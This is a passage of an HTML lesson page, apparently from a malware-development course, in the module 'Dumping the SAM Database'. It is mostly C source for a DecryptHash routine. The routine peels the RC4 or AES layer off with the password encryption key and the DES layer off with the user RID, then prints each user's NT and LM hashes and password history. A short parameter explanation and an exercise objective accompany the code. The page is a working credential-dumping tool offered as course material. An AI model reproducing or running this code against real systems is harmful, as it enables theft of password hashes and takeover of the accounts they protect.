	<span class="token comment">// NetBIOS or DNS names of the workstations from which a user is permitted to log on</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>Workstations<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" Workstations: %.*ws\n"</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Workstations<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>Workstations<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Print the NT hash</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>NTHash<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">DecryptHash</span><span class="token punctuation">(</span>NtHash<span class="token punctuation">,</span> <span class="token operator">&amp;</span>UserVariableData<span class="token operator">-&gt;</span>NTHash<span class="token punctuation">,</span> <span class="token punctuation">(</span>PSAM_HASH<span class="token punctuation">)</span><span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>NTHash<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">,</span> PasswordEncryptionKey<span class="token punctuation">,</span> UserRid<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Print the LM hash, if it exists</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>LMHash<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">DecryptHash</span><span class="token punctuation">(</span>LmHash<span class="token punctuation">,</span> <span class="token operator">&amp;</span>UserVariableData<span class="token operator">-&gt;</span>LMHash<span class="token punctuation">,</span> <span class="token punctuation">(</span>PSAM_HASH<span class="token punctuation">)</span><span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>LMHash<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">,</span> PasswordEncryptionKey<span class="token punctuation">,</span> UserRid<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Print the NT and LM password history</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>NTHistory<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">DecryptHash</span><span class="token punctuation">(</span>NtHistory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>UserVariableData<span class="token operator">-&gt;</span>NTHistory<span class="token punctuation">,</span> <span class="token punctuation">(</span>PSAM_HASH<span class="token punctuation">)</span><span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>NTHistory<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">,</span> PasswordEncryptionKey<span class="token punctuation">,</span> UserRid<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>LMHistory<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">DecryptHash</span><span class="token punctuation">(</span>LmHistory<span class="token punctuation">,</span> <span class="token operator">&amp;</span>UserVariableData<span class="token operator">-&gt;</span>LMHistory<span class="token punctuation">,</span> <span class="token punctuation">(</span>PSAM_HASH<span class="token punctuation">)</span><span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>LMHistory<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">,</span> PasswordEncryptionKey<span class="token punctuation">,</span> UserRid<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p><code>DecryptHash</code> is used to decrypt and print a hash. It takes in 5 parameters:</p>
<ul>
<li>
<p><code>HashType</code> - An enum value describing what kind of hash we want to decrypt: NT hash, LM hash, NT password history or LM password history.</p>
</li>
<li>
<p><code>HashTableEntry</code> - Pointer to the attribute index table entry corresponding to the hash which is to be decrypted. For example, <code>&amp;UserVariableData-&gt;NTHash</code></p>
</li>
<li>
<p><code>Hash</code> - Pointer to the hash data itself. This value is obtained by adding, for example, <code>UserVariableData-&gt;NTHash.Offset</code> to <code>UserVariableData-&gt;Data</code></p>
</li>
<li>
<p><code>PasswordEncryptionKey</code> - Pointer to the PEK, read and decrypted using <code>GetPasswordEncryptionKey</code>.
 It is used to remove the first layer of encryption. Depending on the 
version, this is either RC4 or AES. For AES, the PEK itself is the key, 
while for RC4, the key is a concatenation of the PEK, the user's RID, 
and a string.</p>
</li>
<li>
<p><code>UserRid</code> - The user's RID, used for DES decryption.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">CHAR LmPasswordString<span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token operator">=</span> <span class="token string">"LMPASSWORD"</span><span class="token punctuation">;</span>
CHAR NtPasswordString<span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token operator">=</span> <span class="token string">"NTPASSWORD"</span><span class="token punctuation">;</span>
CHAR LmPasswordHistoryString<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"LMPASSWORDHISTORY"</span><span class="token punctuation">;</span>
CHAR NtPasswordHistoryString<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"NTPASSWORDHISTORY"</span><span class="token punctuation">;</span>

VOID <span class="token function">DecryptHash</span><span class="token punctuation">(</span>_In_ SAM_HASH_TYPE HashType<span class="token punctuation">,</span> _In_ PATTRIBUTE_TABLE_ENTRY HashTableEntry<span class="token punctuation">,</span> _In_ PSAM_HASH Hash<span class="token punctuation">,</span> _In_ PUCHAR PasswordEncryptionKey<span class="token punctuation">,</span> _In_ ULONG UserRid<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">//</span>
	<span class="token comment">// While we know the size of an NT and LM hashes is 16 bytes, there is no way for us to know how long the password history will be.</span>
	<span class="token comment">// To account for this, we calculate the length of the data we want to decrypt by </span>
	<span class="token comment">// substracting size of the SAM_HASH header from the total length of the respective attribute (be it LMHash, NTHash etc.)</span>
	<span class="token comment">//</span>

	PUCHAR DataBuffer <span class="token operator">=</span> Hash<span class="token operator">-&gt;</span>Revision <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span>Hash<span class="token operator">-&gt;</span>Rc4<span class="token punctuation">.</span>Data<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>PUCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span>Hash<span class="token operator">-&gt;</span>Aes<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>
	USHORT DataLength <span class="token operator">=</span> Hash<span class="token operator">-&gt;</span>Revision <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> HashTableEntry<span class="token operator">-&gt;</span>Length <span class="token operator">-</span> <span class="token function">FIELD_OFFSET</span><span class="token punctuation">(</span>SAM_HASH<span class="token punctuation">,</span> Rc4<span class="token punctuation">.</span>Data<span class="token punctuation">)</span> <span class="token operator">:</span> HashTableEntry<span class="token operator">-&gt;</span>Length <span class="token operator">-</span> <span class="token function">FIELD_OFFSET</span><span class="token punctuation">(</span>SAM_HASH<span class="token punctuation">,</span> Aes<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>DataLength <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span>Hash<span class="token operator">-&gt;</span>Revision<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
		<span class="token punctuation">{</span>
			MD5_CTX Md5Context<span class="token punctuation">;</span>

			<span class="token function">MD5Init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> PasswordEncryptionKey<span class="token punctuation">,</span> PEK_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> <span class="token operator">&amp;</span>UserRid<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ULONG<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">//</span>
			<span class="token comment">// The string used in the MD5 hash depends on the type of hash</span>
			<span class="token comment">//</span>

			<span class="token keyword">switch</span> <span class="token punctuation">(</span>HashType<span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">case</span> LmHash<span class="token operator">:</span>
				<span class="token punctuation">{</span>
					<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> LmPasswordString<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LmPasswordString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

				<span class="token keyword">case</span> NtHash<span class="token operator">:</span>
				<span class="token punctuation">{</span>
					<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> NtPasswordString<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>NtPasswordString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

				<span class="token keyword">case</span> LmHistory<span class="token operator">:</span>
				<span class="token punctuation">{</span>
					<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> LmPasswordHistoryString<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LmPasswordHistoryString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

				<span class="token keyword">case</span> NtHistory<span class="token operator">:</span>
				<span class="token punctuation">{</span>
					<span class="token function">MD5Update</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">,</span> NtPasswordHistoryString<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>NtPasswordHistoryString<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>

			<span class="token function">MD5Final</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Md5Context<span class="token punctuation">)</span><span class="token punctuation">;</span>

			STRING Data<span class="token punctuation">;</span>
			Data<span class="token punctuation">.</span>Length <span class="token operator">=</span> Data<span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> DataLength<span class="token punctuation">;</span>
			Data<span class="token punctuation">.</span>Buffer <span class="token operator">=</span> <span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>DataBuffer<span class="token punctuation">;</span>

			STRING Key<span class="token punctuation">;</span>
			Key<span class="token punctuation">.</span>Length <span class="token operator">=</span> Key<span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> MD5_DIGEST_LENGTH<span class="token punctuation">;</span>
			Key<span class="token punctuation">.</span>Buffer <span class="token operator">=</span> Md5Context<span class="token punctuation">.</span>Digest<span class="token punctuation">;</span>

			NTSTATUS Status <span class="token operator">=</span> <span class="token function">SystemFunction033</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Key<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">return</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
		<span class="token punctuation">{</span>
			<span class="token comment">//</span>
			<span class="token comment">// Peel off the AES encryption layer using the PEK</span>
			<span class="token comment">// </span>

			BOOLEAN Result <span class="token operator">=</span> <span class="token function">Aes128Decrypt</span><span class="token punctuation">(</span>PasswordEncryptionKey<span class="token punctuation">,</span> Hash<span class="token operator">-&gt;</span>Aes<span class="token punctuation">.</span>Iv<span class="token punctuation">,</span> DataBuffer<span class="token punctuation">,</span> DataLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>Result <span class="token operator">==</span> FALSE<span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token keyword">return</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">default</span><span class="token operator">:</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Invalid revision: %hu"</span><span class="token punctuation">,</span> Hash<span class="token operator">-&gt;</span>Revision<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Remove the final encryption layer, DES, and print the hash</span>
	<span class="token comment">//</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span>HashType<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">case</span> LmHash<span class="token operator">:</span>
		<span class="token keyword">case</span> NtHash<span class="token operator">:</span>
		<span class="token punctuation">{</span>
			UCHAR    Buffer<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			NTSTATUS Status <span class="token operator">=</span> <span class="token function">SystemFunction027</span><span class="token punctuation">(</span>DataBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>UserRid<span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				<span class="token function">wprintf</span><span class="token punctuation">(</span>HashType <span class="token operator">==</span> NtHash <span class="token operator">?</span> L<span class="token string">" NT hash: "</span> <span class="token operator">:</span> L<span class="token string">" LM hash: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token keyword">for</span> <span class="token punctuation">(</span>UCHAR Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> Index <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> Index<span class="token operator">++</span><span class="token punctuation">)</span>
				<span class="token punctuation">{</span>
					<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"%02X "</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">[</span>Index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>

				<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span>
			<span class="token punctuation">{</span>
				<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not DES decrypt the %ws: 0x%08lX"</span><span class="token punctuation">,</span> HashType <span class="token operator">==</span> NtHash <span class="token operator">?</span> L<span class="token string">"NT hash"</span> <span class="token operator">:</span> L<span class="token string">"LM hash"</span><span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">case</span> LmHistory<span class="token operator">:</span>
		<span class="token keyword">case</span> NtHistory<span class="token operator">:</span>
		<span class="token punctuation">{</span>
			<span class="token comment">//</span>
			<span class="token comment">// We will decrypt and print each hash in the password history, one by one</span>
			<span class="token comment">//</span>

			UCHAR Buffer<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

			<span class="token function">wprintf</span><span class="token punctuation">(</span>HashType <span class="token operator">==</span> NtHistory <span class="token operator">?</span> L<span class="token string">" NT history: "</span> <span class="token operator">:</span> L<span class="token string">" LM history: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">for</span> <span class="token punctuation">(</span>USHORT Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> Index <span class="token operator">&lt;</span> DataLength <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">;</span> Index <span class="token operator">+=</span> <span class="token number">16</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				NTSTATUS Status <span class="token operator">=</span> <span class="token function">SystemFunction027</span><span class="token punctuation">(</span>DataBuffer <span class="token operator">+</span> Index<span class="token punctuation">,</span> <span class="token operator">&amp;</span>UserRid<span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token punctuation">{</span>
					<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"\n	"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

					<span class="token keyword">for</span> <span class="token punctuation">(</span>UCHAR Index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> Index <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> Index<span class="token operator">++</span><span class="token punctuation">)</span>
					<span class="token punctuation">{</span>
						<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"%02X "</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">[</span>Index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>

			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-8">Demonstration</h3>
<p>Example output of domain fixed data:</p>
<img src="75_files/DomainOutput.png" style="margin:auto" width="1000px">
<p>Example output for a user:</p>
<img src="75_files/UserOutput.png" style="margin:auto" width="800px">

    </div>

    
        
</div></div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Run
 the tool and inspect the domain fixed attributes. Then, use the 
New-LocalUser PowerShell command to add a user to the local domain 
before running the tool again. What changed?</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:40px" data-target-id="toc-heading-0">
        <span class="text-gray-300 hover:text-white text-sm">Dumping the SAM Database</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-1">
        <span class="text-gray-300 hover:text-white text-sm">Introduction to Authentication</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-2">
        <span class="text-gray-300 hover:text-white text-sm">Interactive Authentication</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-3">
        <span class="text-gray-300 hover:text-white text-sm">The Local Domain</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-4">
        <span class="text-gray-300 hover:text-white text-sm">Network Authentication</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-5">
        <span class="text-gray-300 hover:text-white text-sm">Dumping the SAM Database</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-6">
        <span class="text-gray-300 hover:text-white text-sm">Dumping local domain information</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-7">
        <span class="text-gray-300 hover:text-white text-sm">Dumping password hashes</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-8">
        <span class="text-gray-300 hover:text-white text-sm">Demonstration</span>
      </div></div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="75_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill="">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html">
                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
